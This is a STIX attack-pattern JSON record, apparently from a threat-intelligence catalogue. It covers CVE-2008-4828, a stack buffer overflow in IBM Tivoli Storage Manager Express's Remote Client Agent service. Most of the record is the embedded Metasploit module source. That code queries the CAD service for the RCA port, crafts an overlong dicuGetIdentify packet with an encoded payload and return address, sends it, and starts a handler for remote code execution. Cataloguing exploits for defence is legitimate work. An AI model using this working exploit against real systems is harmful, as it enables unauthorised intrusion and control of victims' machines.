{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--417446e3-7289-4941-9c6a-cb191b12e57c",
    "created": "2024-08-14T16:45:37.131506Z",
    "modified": "2024-08-14T16:45:37.13151Z",
    "name": "IBM Tivoli Storage Manager Express RCA Service Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in the IBM Tivoli Storage Manager Express Remote Client Agent service. By sending a \"dicuGetIdentify\" request packet containing a long NodeName parameter, an attacker can execute arbitrary code.  NOTE: this exploit first connects to the CAD service to start the RCA service and obtain the port number on which it runs. This service does not restart. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/ibm_tsm_rca_dicugetidentify.rb",
            "external_id": "ibm_tsm_rca_dicugetidentify.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-4828"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'IBM Tivoli Storage Manager Express RCA Service Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in the IBM Tivoli Storage Manager Express Remote\n        Client Agent service. By sending a \"dicuGetIdentify\" request packet containing a long\n        NodeName parameter, an attacker can execute arbitrary code.\n\n        NOTE: this exploit first connects to the CAD service to start the RCA service and obtain\n        the port number on which it runs. This service does not restart.\n      },\n      'Author'         => [ 'jduck' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2008-4828' ],\n          [ 'OSVDB', '54232' ],\n          [ 'BID', '34803' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'seh',\n        },\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          # wchar_t buf[1024];\n          'Space'    => ((1024*2)+4),\n          'BadChars' => \"\\x00\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # this target should be pretty universal..\n          # dbghelp.dll is shipped with TSM Express, and hasn't been kept up-to-date..\n          [ 'IBM Tivoli Storage Manager Express 5.3.6.2', { 'Ret' => 0x028495d3 } ], # p/p/r dbghelp.dll v6.0.17.0\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2009-11-04'))\n\n    register_options( [ Opt::RPORT(1582) ])\n  end\n\n\n  def make_tsm_packet(op,data)\n    pkt = \"\"\n    if op > 0xff\n      pkt << [0,8,0xa5,op,0xc+data.length].pack('nCCNN')\n    else\n      pkt << [data.length,op,0xa5].pack('nCC')\n    end\n    pkt << data\n  end\n\n\n  def explode_tsm_packet(buf)\n    return nil if buf.length < 4\n    len,op,magic = buf[0,4].unpack('nCC')\n    return nil if magic != 0xa5\n    if op == 0x08\n      return nil if buf.length < 12\n      op,len = buf[4,8].unpack('NN')\n      data = buf[12,len]\n    else\n      data = buf[4,len]\n    end\n\n    return op,data\n  end\n\n\n  def extract_port(buf)\n    op,data = explode_tsm_packet(buf)\n    if op != 0x10300\n      print_error(\"Invalid response verb from CAD service: 0x%x\" % op)\n      return nil\n    end\n    if data.length < 6\n      print_error(\"Insufficient data from CAD service.\")\n      return nil\n    end\n    port_str_len = data[4,2].unpack('n')[0]\n    if data.length < (24+port_str_len)\n      print_error(\"Insufficient data from CAD service.\")\n      return nil\n    end\n    data[24,port_str_len].unpack('n*').pack('C*').to_i\n  end\n\n\n  def exploit\n\n    print_status(\"Trying target %s...\" % target.name)\n\n    # first get the port number\n    query = [1].pack('n')\n    query << \"\\x00\" * 10\n    data = make_tsm_packet(0x10200, query)\n\n    connect\n    print_status(\"Attempting to start the RCA service via the CAD service...\")\n    sock.put(data)\n    buf = sock.get_once(-1, 10)\n    disconnect\n\n    rca_port = extract_port(buf)\n    if not rca_port or rca_port == 0\n      print_error(\"The RCA agent service was not started :(\")\n    else\n      print_status(\"RCA Agent is now running on port %u\" % rca_port)\n    end\n\n\n    # trigger the vulnerability\n    copy_len = payload_space + 4\n    sploit = rand_text(33)\n    # start offset, length\n    sploit[10,4] = [0,copy_len].pack('n*')\n    # data to copy\n    buf = payload.encoded\n    # we need this special encoding to make it work..\n    buf << [target.ret].pack('V').unpack('v*').pack('n*')\n    # adjustment :)\n    sploit << buf\n    data = make_tsm_packet(0x10400, sploit)\n\n    connect(true, { 'RPORT' => rca_port })\n    print_status(\"Sending specially crafted dicuGetIdentifyRequest packet...\")\n    sock.write(data)\n\n    print_status(\"Starting handler...\")\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-11-04",
    "x_mitre_platforms": [
        "win'"
    ]
}